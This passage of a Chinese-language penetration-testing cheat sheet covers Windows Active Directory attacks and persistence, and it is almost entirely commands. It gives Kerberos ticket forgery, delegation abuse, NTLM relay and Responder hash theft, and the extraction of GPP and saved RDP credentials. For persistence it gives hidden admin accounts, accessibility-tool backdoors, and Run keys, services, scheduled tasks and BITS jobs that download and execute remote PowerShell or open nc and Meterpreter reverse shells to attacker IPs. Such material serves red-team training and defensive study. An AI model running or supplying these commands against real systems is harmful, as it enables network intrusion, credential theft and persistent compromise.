title="Mimikatz+MSF"></a>Mimikatz+MSF</h4><pre><code>&gt;whoami /user 查看SIDmsf &gt;use auxiliary/admin/kerberos/ms14_068_kerberos_checksummsf &gt;set domain 域名msf &gt;set password 密码msf &gt;set rhost 域控机器msf &gt;set user 用户msf &gt;set user_sid sid得到.bin文件#apt-get install krb5-user上传mimikatz和bin文件Mimikatz# Kerberos::clist “xxxx.bin” /export生成kirbi文件Meterpreter &gt;load kiwiMeterpreter &gt;download c:/wmpub/xxxxxx.kirbi /tmp/注入票据Meterpreter &gt;kerberos_ticket_use /tmp/xxxxxx.kirbi#use exploit/windows/local/current_user_psexec#set TECHNIQUE PSH#set RHOST dc.xx.com#set payload windows/meterpreter/reverse_tcp#set LHOST 192.168.1.1#set session 1#exploit</code></pre><h4 id="goldenPac-py"><a href="#goldenPac-py" class="headerlink" title="goldenPac.py"></a>goldenPac.py</h4><pre><code>kali下#apt-get install krb5-user#goldenPac.py –dc-ip 10.1.1.100 –target-ip 10.1.1.100 zone.com/y:password@dc.zone.com</code></pre><h3 id="账户委派"><a href="#账户委派" class="headerlink" title="账户委派"></a>账户委派</h3><h4 id="账户非受限委派"><a href="#账户非受限委派" class="headerlink" title="账户非受限委派"></a>账户非受限委派</h4><pre><code>设置用户y为服务账户(服务账户有委派权限)&gt;setspn -U -A variant/golden y</code></pre><p><img src="./img/398.png" alt="image"></p><pre><code>查询非受限委派域内账号，使用powerview&gt;Get-NetUser -Unconstrained -Domain zone.com</code></pre><p><img src="./img/399.png" alt="image"></p><pre><code>利用管理员权限打开mimikatz导出TGT&gt;privilege::debug&gt;sekurlsa::tickets /export</code></pre><p><img src="./img/400.png" alt="image"></p><pre><code>清空票据，导入票据</code></pre><p><img src="./img/401.png" alt="image"><br><img src="./img/402.png" alt="image"></p><pre><code>获得Powershell会话&gt; Enter-PSSession -ComputerName dc.zone.com</code></pre><p><img src="./img/403.png" alt="image"></p><h4 id="账户受限委派"><a href="#账户受限委派" class="headerlink" title="账户受限委派"></a>账户受限委派</h4><pre><code>查询受限委派用户&gt; Get-DomainUser -TrustedToAuth –Domain zone.com</code></pre><p><img src="./img/404.png" alt="image"></p><pre><code>查询受限委派主机&gt; Get-DomainComputer -TrustedToAuth -Domain zone.com</code></pre><p><img src="./img/405.png" alt="image"></p><pre><code>利用方法后见权限维持模块</code></pre><h3 id="资源受限委派"><a href="#资源受限委派" class="headerlink" title="资源受限委派"></a>资源受限委派</h3><pre><code>获取域管理员&gt;Get-DomainUser|select -First 1域对象信息&gt;Get-DomainObject -Identity &#39;DC=zone,DC=com&#39;ms-ds-machineaccountquota允许非特权用户将最多 10 台计算机连接到域</code></pre><p><img src="./img/406.png" alt="image"></p><pre><code>查看有没有设置msDS-AllowedToActOnBehalfOfOtherIdentity策略&gt;Get-DomainComputer dc|select name, msDS-AllowedToActOnBehalfOfOtherIdentity</code></pre><p><img src="./img/407.png" alt="image"></p><pre><code>用powermad添加一具备SPN的机器账户https://github.com/Kevin-Robertson/Powermad&gt;New-MachineAccount -MachineAccount newcom</code></pre><p><img src="./img/408.png" alt="image"></p><pre><code>或&gt;$pass = ConvertTo-SecureString &#39;123qwe!@#&#39; -AsPlainText –Force&gt;New-MachineAccount –MachineAccount newcom -Password $pass或&gt;New-MachineAccount -MachineAccount newcom -Password $(ConvertTo-SecureString &#39;123qwe!@#&#39; -AsPlainText -Force)</code></pre><p><img src="./img/409.png" alt="image"></p><pre><code>获取添加的机器账户的SID</code></pre><p><img src="./img/410.png" alt="image"></p><pre><code>将添加的机器账户的SID设置给DC的msDS-AllowedToActOnBehalfOfOtherIdentity参数&gt;$SD=New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2346829310-1781191092-2540298887-1122)&quot;; $SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer dc | Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes&#125;设置完成后查看</code></pre><p><img src="./img/411.png" alt="image"></p><pre><code>配置ACL允许访问&gt;$RawBytes=Get-DomainComputer dc -Properties &#39;msds-allowedtoactonbehalfofotheridentity&#39; |select -expand msds-allowedtoactonbehalfofotheridentity;$Descriptor= New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes,0;$Descriptor.DiscretionaryAcl</code></pre><p><img src="./img/412.png" alt="image"></p><pre><code>此时使用创建的机器账户的hash可伪造域管先获取newcom的NTLM&gt;Rubeus.exe hash /password:123qwe!@# /user:newcom /domain:zone.com</code></pre><p><img src="./img/413.png" alt="image"></p><pre><code>导入票据伪造域管用户访问cifs服务&gt;Rubeus.exe s4u /user:newcom$ /rc4:00AFFD88FA323B00D4560B F9FEF0EC2F /impersonateuser:godadmin /msdsspn:cifs/dc.zone.com /ptt</code></pre><p><img src="./img/414.png" alt="image"></p><pre><code>成功获取到godadmin的tgs</code></pre><p><img src="./img/415.png" alt="image"><br><img src="./img/416.png" alt="image"><br><img src="./img/417.png" alt="image"></p><h3 id="CVE-2019-0708"><a href="#CVE-2019-0708" class="headerlink" title="CVE-2019-0708"></a>CVE-2019-0708</h3><pre><code>&gt;python ntlmrelayx.py -t ldaps://dc.zone.com --remove-mic --delegate-access -smb2support&gt;python printerbug.py zone.com/y@win7.zone.com 192.168.0.attack&gt;python getST.py -spn host/win7.zone.com &#39;zone.com/机器账户$:密码&#39; -impersionate administrator -dc-ip 192.168.0.1&gt;export KRB5CCNAME=XX.ccahe&gt;python secretdump.py -k -no-pass dc.zone.com -just-dc</code></pre><h3 id="NTLM中继"><a href="#NTLM中继" class="headerlink" title="NTLM中继"></a>NTLM中继</h3><h4 id="Ntlmrelayx-资源受限委派"><a href="#Ntlmrelayx-资源受限委派" class="headerlink" title="Ntlmrelayx+资源受限委派"></a>Ntlmrelayx+资源受限委派</h4><pre><code>域控需启用ldaps，域机器启用ipv6*当执行ntlmrelayx脚本时，遇到报错</code></pre><p><img src="./img/418.png" alt="image"></p><pre><code>修改impacket/impacket/examples/ntlmrelayx/attacks/ldapattack.py ldapattack.py脚本，在510行上方加入if self.config.interactive: </code></pre><p><img src="./img/419.png" alt="image"></p><pre><code>再重新安装&gt;python setup.py install使用mitm6通过ipv6接管dns服务器，配置好后开始请求网络的WPAD&gt;mitm6 -i eth1 -d zone.com</code></pre><p><img src="./img/420.png" alt="image"></p><pre><code>使用ntlmreplyx.py监听&gt;python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --add-computer当目标重启网络、访问浏览器、重启电脑时会把攻击机视为代理服务器，当目标通过攻击机代理服务器访问网络时，攻击机将会向目标发送代理的认证请求，并中继NTLM认证到LDAP服务器上，完成攻击。这里要使用ldaps，因为域控会拒绝在不安全的连接中创建账户。</code></pre><p><img src="./img/421.png" alt="image"></p><pre><code>可以看到已经成功添加了一个机器账户RFAYOVCC密码6YdX.NXqQGyuR7[使用此机器账户申请票据&gt;python getST.py -spn cifs/sub2k8.zone.com zone.com/RFAYOVCC\$ -impersonate y</code></pre><p><img src="./img/422.png" alt="image"></p><pre><code>&gt;export KRB5CCNAME=y.ccache获取shell&gt;python smbexec.py -no-pass -k sub2k8.zone.com</code></pre><p><img src="./img/423.png" alt="image"></p><pre><code>dumphash、缓存hash&gt;python secretsdump.py -k -no-pass sub2k8.zone.com</code></pre><p><img src="./img/424.png" alt="image"></p><pre><code>当域控机器未启用LDAPS，并且已获得域普通用户权限时使用powermad创建一个机器账户newcomhttps://github.com/Kevin-Robertson/Powermad&gt;New-MachineAccount -MachineAccount newcom -Password $(ConvertTo-SecureString &#39;123qwe!@#&#39; -AsPlainText -Force)</code></pre><p><img src="./img/425.png" alt="image"></p><pre><code>或</code></pre><p><img src="./img/426.png" alt="image"><br><img src="./img/427.png" alt="image"></p><pre><code>&gt;python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --escalate-user newcom\$</code></pre><p><img src="./img/428.png" alt="image"></p><pre><code>后续正常操作即可。内网存在java webdav时PROPPATCH、PROPFIND、 LOCK等请求方法接受XML作为输入时会形成xxe。攻击者要求采用NTLM认证方式是，webdav会自动使用当前用户的凭据认证。使用ntlmrelayx监听&gt;python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --escalate-user newcom\$Burp发送xxe请求PROPFIND /webdav HTTP/1.1Host: 1.1.1.1&lt;?xml version&quot;1.0&quot; encoding=&quot;UFT-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY loot SYSTEM &quot;http://10.1.1.101&quot;&gt; ]&gt;&lt;D:xxe xmln:D=&quot;DAV:&quot;&gt;&lt;D:set&gt;&lt;D:prop&gt;&lt;a xmlns=&quot;http://xx.e&quot;&gt;&amp;loot;&lt;/a&gt;&lt;/D:prop&gt;&lt;/D:set&gt;&lt;/D:xxe&gt;</code></pre><h4 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h4><h5 id="SMB协议截获"><a href="#SMB协议截获" class="headerlink" title="SMB协议截获"></a>SMB协议截获</h5><pre><code>内网中间人攻击脚本，kali内置监听网络接口&gt;responder -I wlan0(eth0)指定某台机器或网段：修改/etc/responder/Responder.py中RespondTo参数。网段中有认证行为会捕获NTLMv2 hash</code></pre><p><img src="./img/429.png" alt="image"></p><pre><code>当访问一个不存在的共享时修改配置文件来解析Xp修改/usr/share/responder/servers/SMB.py定位到errorcode修改为\x71\x00\x00\xc0，删除掉/usr/share/responder/Responder.db</code></pre><p><img src="./img/430.png" alt="image"></p><pre><code>XP时使用\\cmd\share形式访问共享输入密码达4次会断开连接。定位到</code></pre><p><img src="./img/431.png" alt="image"></p><pre><code>修改self.ntry != 10Win7以上修改/usr/share/responder/servers/SMB.py定位到##Session Setup 3</code></pre><p><img src="./img/432.png" alt="image"></p><pre><code>删除掉and GrabMessageID(data)[0:1] == &quot;\x02&quot;，删除掉/usr/share/responder/Responder.db修改后可以进行解析，捕获hash，否则会报错误64</code></pre><p><img src="./img/433.png" alt="image"></p><pre><code>强制截取NTLMv1 hash，修改/usr/share/responder/packets.py，定位到以下参数，修改为\x15\x82\x81\xe2，修改Conf文件设置Challenge为16位固定值。</code></pre><p><img src="./img/434.png" alt="image"><br><img src="./img/435.png" alt="image"><br><img src="./img/436.png" alt="image"></p><h5 id="WPAD代理欺骗"><a href="#WPAD代理欺骗" class="headerlink" title="WPAD代理欺骗"></a>WPAD代理欺骗</h5><pre><code>&gt;responder -I eth0 -v -F F参数即可开启强制WPAD认证服务抓取 hash，访问IE或重启电脑即可发送欺骗认证获得hash。</code></pre><p><img src="./img/437.png" alt="image"><br><img src="./img/438.png" alt="image"></p><pre><code>重启也可以抓到</code></pre><p><img src="./img/439.png" alt="image"></p><h5 id="Web漏洞"><a href="#Web漏洞" class="headerlink" title="Web漏洞"></a>Web漏洞</h5><pre><code>内网中使用文件包含漏洞和XSS&gt;Responder -I eth0 -vhttp://10.1.1.1/file.php?file=\\10.1.1.12\sharehttp://10.1.1.1/xss.php?article=&lt;img src=\\10.1.1.12\xx&gt;</code></pre><h5 id="中继攻击"><a href="#中继攻击" class="headerlink" title="中继攻击"></a>中继攻击</h5><pre><code>修改/etc/responder/Responder.conf文件，配置smb和http为Off，分别开启两个对话框，使用F参数启用WPAD欺骗浏览器，使用/usr/share/responder/tools中的MultiReplay.py进行中继攻击获得目标cmdshell。&gt;Responder -I eth0 -v -F&gt;python MultiReplay.py -t 192.168.0.115 -u ALL</code></pre><p><img src="./img/440.png" alt="image"><br><img src="./img/441.png" alt="image"></p><h5 id="NTLMv2Hash破解"><a href="#NTLMv2Hash破解" class="headerlink" title="NTLMv2Hash破解"></a>NTLMv2Hash破解</h5><pre><code>使用hashcat破解 -m 5600为NTLMv2类型&gt;hashcat -m 5600 pass.txt wordlists.txt</code></pre><p><img src="./img/442.png" alt="image"></p><h3 id="GPP-Password"><a href="#GPP-Password" class="headerlink" title="GPP-Password"></a>GPP-Password</h3><pre><code>域内机器可访问\\zone.com\SYSVOL\zone.com共享文件夹，翻看策略文件，查找groups.xml，ScheduledTasks\ScheduledTasks.xml，Printers\Printers.xml，Drives\Drives.xml，DataSources\DataSources.xml， Services\Services.xml等文件</code></pre><p><img src="./img/443.png" alt="image"></p><pre><code>使用powersploit脚本解密</code></pre><p><img src="./img/444.png" alt="image"></p><pre><code>使用msf的auxiliary/scanner/smb/smb_enum_gpp模块</code></pre><p><img src="./img/445.png" alt="image"></p><h3 id="WinRM无文件执行"><a href="#WinRM无文件执行" class="headerlink" title="WinRM无文件执行"></a>WinRM无文件执行</h3><pre><code>&gt;winrm quickconfig –q启动winrm或PS&gt;Enable-PSRemoting -Force生成木马并启动监听</code></pre><p><img src="./img/446.png" alt="image"><br><img src="./img/447.png" alt="image"></p><pre><code>放入已获得权限的机器C盘中内网另外机器中执行&gt;net use \\192.168.0.115\c$&gt;winrm invoke create wmicimv2/win32_process @&#123;commandline=&quot;\\192.168.0.115\c\index.exe&quot;&#125;</code></pre><h3 id="添加域管命令"><a href="#添加域管命令" class="headerlink" title="添加域管命令"></a>添加域管命令</h3><pre><code>&gt;net user admin$ pass@123 /add /doamin&gt;net group &quot;Domain admins&quot; admin$ /add /domain</code></pre><h3 id="SSH密钥免密登录"><a href="#SSH密钥免密登录" class="headerlink" title="SSH密钥免密登录"></a>SSH密钥免密登录</h3><pre><code>&gt;ssh -i id_rsa user@192.168.0.110</code></pre><h3 id="获取保存的RDP密码"><a href="#获取保存的RDP密码" class="headerlink" title="获取保存的RDP密码"></a>获取保存的RDP密码</h3><pre><code>位置C:\Users\用户名\AppData\Local\Microsoft\Credentials查看命令&gt;cmdkey /list&gt;mimikatz log#dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\D53BF8DC4D52D75463D46595907A4015记录guidMasterKey: &#123;572115f2-80b1-4b1e-be1b-425f5c7a8bfd&#125;#privilege::debug#sekurlsa::dpapi找到GUID为guidMasterKey的值下面的MasterKey: d928f5e02d2e9495f92bb…#dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\D53BF8DC4D52D75463D46595907A4015 /masterkey: d928f5e02d2e9495f92bb…密码为CredentialBlob值。</code></pre><h2 id="后门-amp-持久化-1"><a href="#后门-amp-持久化-1" class="headerlink" title="后门&amp;持久化"></a>后门&amp;持久化</h2><h3 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h3><pre><code>&gt;net user test$ test /add&gt;net localgroup administrators test$ /add注册表HKEY_LOCAL_MACHINE\SAM\SAM\给予administrator SAM的完全控制和读取的权限以下导出为1.regHKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$记录HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$的默认类型000003EA以下导出为2.regHKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA默认administrator默认类型为000001F4以下导出为3.regHKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4把000001F4(3.reg)的F值粘贴到000003EA(2.reg)的F值修改后导入&gt;regedit /s 1.reg&gt;regedit /s 2.reg删除net user test$ /delPowershell脚本https://github.com/3gstudent/Windows-User-Clone/blob/master/Windows-User-Clone.ps1需system权限&gt;Create-Clone -u 要创建的 -p 密码 -cu 想要克隆的</code></pre><p><img src="./img/448.png" alt="image"><br><img src="./img/449.png" alt="image"></p><h3 id="RID劫持"><a href="#RID劫持" class="headerlink" title="RID劫持"></a>RID劫持</h3><pre><code>利用场景：激活guest修改rid为管理员的修改低权限用户rid劫持rid之前普通用户1的rid值</code></pre><p><img src="./img/450.png" alt="image"></p><pre><code>使用msf的post/windows/manage/rid_hijack模块</code></pre><p><img src="./img/451.png" alt="image"></p><pre><code>运行后可以看到已经变为超管的rid值</code></pre><p><img src="./img/452.png" alt="image"></p><pre><code>此时普通用户1登录系统是为超管权限</code></pre><h3 id="Guest激活"><a href="#Guest激活" class="headerlink" title="Guest激活"></a>Guest激活</h3><pre><code>激活来宾账户，修改其密码，加入administrators组&gt;net user guest /active:yes&gt;net user guest 123qwe!@#&gt;net localgroup administrators guest /ad</code></pre><h3 id="映像劫持-1"><a href="#映像劫持-1" class="headerlink" title="映像劫持"></a>映像劫持</h3><h4 id="Sethc"><a href="#Sethc" class="headerlink" title="Sethc"></a>Sethc</h4><pre><code>&gt;move sethc.exe 1.exe&gt;copy cmd.exe sethc.exe5下shift调用cmd</code></pre><h4 id="轻松使用"><a href="#轻松使用" class="headerlink" title="轻松使用"></a>轻松使用</h4><pre><code>注册表计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\新建Utilman.exe，新建字符串值Debugger,指定为C:\Windows\System32\cmd.exe&gt; REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</code></pre><h4 id="IFEO静默执行"><a href="#IFEO静默执行" class="headerlink" title="IFEO静默执行"></a>IFEO静默执行</h4><pre><code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe 新建DWORD值GlobalFlag 16进制为200创建：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe字符串值：MonitorProcess=muma.exeDWORD值ReportingMode=1&gt;reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /f&gt;reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v GlobalFlag /t REG_DWORD /d 512 /f&gt;reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; /v ReportingMode /t REG_DWORD /d 1  /f&gt;reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot; /f</code></pre><h3 id="注册表启动项"><a href="#注册表启动项" class="headerlink" title="注册表启动项"></a>注册表启动项</h3><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceHKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RunHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></pre><h4 id="MSF-9"><a href="#MSF-9" class="headerlink" title="MSF"></a>MSF</h4><pre><code>添加一个监听Meterpreter&gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39;查询是否添加成功Meterpreter&gt; reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v ncMeterpreter&gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run开启防火墙进站规则&gt; netsh firewall add portopening TCP 444 &quot;name&quot; ENABLE ALL重启&gt; shutdown -r -t 0</code></pre><h4 id="CMD-1"><a href="#CMD-1" class="headerlink" title="CMD"></a>CMD</h4><pre><code>查看注册表启动项&gt;REG query &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;添加启动项&gt;REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /V &quot;windowsupdate&quot; /t REG_SZ /F /D &quot;c:\windows\temp\update.exe&quot;删除启动项&gt;REG delete &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /V &quot;windowsupdate&quot; /f</code></pre><h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><h4 id="加载powershell"><a href="#加载powershell" class="headerlink" title="加载powershell"></a>加载powershell</h4><pre><code>&gt;schtasks /Create /tn 名字 /tr 运行程序 /sc hourly /mo 1&gt;schtasks /create /S TARGET /SC Weekly /RU &quot;NT Authority\SYSTEM&quot; /TN &quot;STCheck&quot; /TR &quot;powershell.exe -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://192.168.0.107:8080/Invoke-PowerShellTcp.ps1&#39;&#39;&#39;)&#39;&quot;</code></pre><h4 id="执行exe"><a href="#执行exe" class="headerlink" title="执行exe"></a>执行exe</h4><pre><code>创建计划任务&gt;schtasks /create /RL HIGHEST /F /tn &quot;windowsupdate&quot; /tr &quot;c:\windows\temp\update.exe&quot; /sc DAILY /mo 1 /ST 12:25 /RU SYSTEM查看计划任务&gt;schtasks /query | findstr &quot;windowsupdate&quot;立即执行某项计划任务&gt;schtasks /run /tn &quot;windowsupdate&quot;删除某项计划任务&gt;schtasks /delete /F /tn &quot;windowsupdate&quot;普通用户权限计划任务&gt;schtasks /create /F /tn &quot;windowsupdate&quot; /tr &quot;D:\user\zhangsan\file\windowsupdate.exe&quot; /sc DAILY /mo 1 /ST 12:25 &gt;schtasks /query | findstr &quot;windowsupdate&quot; &gt;schtasks /run /tn &quot;windowsupdate&quot; &gt;schtasks /delete /F /tn &quot;windowsupdate&quot; &gt;schtasks /tn &quot;SysDebug&quot; /query /fo list /v</code></pre><h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3><h4 id="AppCertDlls"><a href="#AppCertDlls" class="headerlink" title="AppCertDlls"></a>AppCertDlls</h4><pre><code>注册表HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SessionManager\下新建AppCertDlls，新建名字为Default，值为c:\1.dll的项#msfvenom –p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 –f dll &gt;/root/1.dllMsf&gt;use exploit/multi/handlerMsf&gt;set payload windows/meterpreter/reverse_tcphttps://cdn.securityxploded.com/download/RemoteDLLInjector.zip&gt; RemoteDLLInjector64.exe PID c:\1.dll</code></pre><h4 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h4><pre><code>注册表HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Window\Appinit_Dlls下AppInit_DLLs设置为c:\1.dll，LoadAppInit_DLLs设置为1</code></pre><h4 id="MSF-10"><a href="#MSF-10" class="headerlink" title="MSF"></a>MSF</h4><pre><code>Msf&gt;use post/windows/manage/reflective_dll_injectMsf&gt;set session 1Msf&gt;set pid 1234Msf&gt;set path c:\\1.dllMsf&gt;run&amp;migrate +pid&amp;Meterpreter&gt;run post/windows/manage/migrate</code></pre><h3 id="登录初始化"><a href="#登录初始化" class="headerlink" title="登录初始化"></a>登录初始化</h3><pre><code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon下添加Userinit值&gt;Powershell.exe Set-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name Userinit -value &quot;C:\Windows\system32\userinit.exe,c:\muma.exe&quot;计算机\HKEY_CURRENT_USER\Environment创建键值UserInitMprLogonScript值为c:\muma.exe&amp;Powershell实现：&gt;Set-ExecutionPolicy RemoteSigned 保存ps1执行Set-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name Userinit -value &quot;C:\Windows\system32\userinit.exe,powershell.exe -nop -w hidden -c $w=new-object net.webclient;$w.proxy=[Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.downloadstring(&#39;http://192.168.2.11:8080/kaMhC1&#39;);&quot;# powershell反弹shell的payload参照msf中的web_delivery模块</code></pre><h4 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h4><pre><code>计算机\HKEY_CURRENT_USER\Control Panel\DesktopSCRNSAVE.EXE - 默认屏幕保护程序，改为恶意程序(设置备份)ScreenSaveActive - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态ScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）</code></pre><h3 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h3><pre><code>&gt;git clone https://github.com/khr0x40sh/metasploit-modules.git&gt;mv metasploit-modules/persistence/mof_ps_persist.rb /usr/share/metasploit-framework/modules/post/windows/&gt;reload_all&gt;use post/windows/mof_ps_persist&gt;set payload windows/x64/meterpreter/reverse_tcp&gt;set lhost 192.168.0.108&gt;set lport 12345&gt;set session 1&gt;run</code></pre><p><img src="./img/453.png" alt="image"></p><pre><code>&gt;use exploit/multi/handler&gt;set payload windows/x64/meterpreter/reverse_tcp&gt;set lhost 192.168.0.108&gt;set lport 12345&gt;set exitonsession false</code></pre><p><img src="./img/454.png" alt="image"></p><pre><code>重启后还会上线</code></pre><p><img src="./img/455.png" alt="image"></p><pre><code>清除后门，进入meterpreter，resource 生成的rc文件停止MOF&gt;net stop winmgmt删除文件夹：C:\WINDOWS\system32\wbem\Repository\&gt;net start winmgmt </code></pre><h3 id="WinRM端口复用"><a href="#WinRM端口复用" class="headerlink" title="WinRM端口复用"></a>WinRM端口复用</h3><pre><code>WinRM端口5985，win2012以上默认启动，2008开启命令&gt;winrm quickconfig -q2012启用端口复用&gt;winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;2008启用WinRM后修改端口为80&gt;winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;后门连接和使用本地开启WinRM并设置信任连接主机&gt;winrm quickconfig -q&gt;winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;执行命令&gt;winrs -r:http://10.1.1.100 -u:administrator -p:password ipconfig /all获取cmdshell&gt;winrs -r:http://10.1.1.100 -u:administrator -p:password cmd</code></pre><p><img src="./img/456.png" alt="image"></p><pre><code>只administrator允许远程登录WinRM，允许其他用户可以登录，执行注册表&gt;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></pre><h3 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h3><pre><code>重启维持nc&gt;sc create ms binpath= &quot;cmd /K start c:\nc\nc64.exe -d 192.168.0.51 4567 -e cmd.exe&quot; start= delayed-auto error= ignore重启维持psh#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=11111 -f psh-reflection &gt;/var/www/html/xxx.ps1&gt;sc create ms binpath= &quot;cmd /K start C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -c \&quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/xxx.ps1&#39;)\&quot;&quot; start= delayed-auto error= ignore</code></pre><p><img src="./img/457.png" alt="image"></p><pre><code>重启维持Cobalt strike配置监听器，生成web传递模块Powershell脚本&gt;sc create ms binpath= &quot;cmd /K start C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.0.107:8080/a&#39;))\&quot;&quot; start= delayed-auto error= ignore</code></pre><p><img src="./img/458.png" alt="image"></p><pre><code>Delay执行大概2分钟上线&gt;sc delete ms 卸载服务Powershell&gt;powershell.exe new-service -Name nuoyani -BinaryPathName &quot;C:\WINDOWS\Temp\360.exe&quot; -StartupType Automatic&gt;$c2=&#39;new-&#39;;$c3=&#39;service -Name nuoyani -DisplayName OrderServ -BinaryPathName &quot;C:\accc.exe&quot; -StartupType Automatic&#39;; $Text=$c2+$c3;IEX(-join $Text)</code></pre><h3 id="Bitadmin"><a href="#Bitadmin" class="headerlink" title="Bitadmin"></a>Bitadmin</h3><pre><code>创建下载任务&gt;bitsadmin /create empire下载的文件设置&gt;bitsadmin /addfile empire %comspec% c:\windows\temp\1.exe设置传输时运行的命令,MSFvenom生成dll放入temp目录&gt;bitsadmin /SetNotifyCmdLine empire cmd.exe &quot;cmd.exe /c rundll32 c:\windows\temp\1.dll,0&quot;(bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://x.com/shell.sct scrobj.dll&quot;)启动任务&gt;bitsadmin /resume empire列出所有用户的下载任务&gt;bitsadmin /list /allusers /verbose</code></pre><p><img src="./img/459.png" alt="image"></p><pre><code>重启后也会上线</code></pre><p><img src="./img/460.png" alt="image"></p><pre><code>完成任务&gt;bitsadmin /complete empire&gt;bitsadmin /cancel &lt;Job&gt; //删除某个任务&gt;bitsadmin /reset /allusers //删除所有任务&amp;&gt;bitsadmin /create mission&gt;bitsadmin /addfile mission %comspec% %temp%\cmd.exe&gt;bitsadmin.exe /SetNotifyCmdLine mission regsvr32.exe &quot;/u /s /i:http://192.168.0.107/shell.sct scrobj.dll&quot;&gt;bitsadmin /Resume mission</code></pre><h3 id="CLR-Injection"><a href="#CLR-Injection" class="headerlink" title="CLR Injection"></a>CLR Injection</h3><pre><code>劫持调用.net程序，开机启动https://github.com/3gstudent/CLR-Injection/blob/master/CLR-Injection_x64.bat</code></pre><p><img src="./img/461.png" alt="image"><br><img src="./img/462.png" alt="image"></p><pre><code>WMIC可替换为powershellNew-ItemProperty 